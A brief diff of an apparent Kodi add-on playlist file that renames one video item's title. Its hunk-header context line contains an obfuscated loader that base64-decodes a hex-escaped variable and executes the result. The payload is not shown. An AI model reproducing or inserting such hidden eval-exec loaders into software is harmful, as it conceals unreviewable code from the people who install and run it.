@@ -197,7 +197,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 
 
 <item>
-<title>[COLOR gold]*[/COLOR][COLOR white]El Crimen De La Guardia Urbana[/COLOR]</title>    
+<title>[COLOR gold]*[/COLOR][COLOR white]Los Crimenes De La Guardia Urbana[/COLOR]</title>    
 <link>$doregex[c]</link>
 <regex>
 <name>c</name>
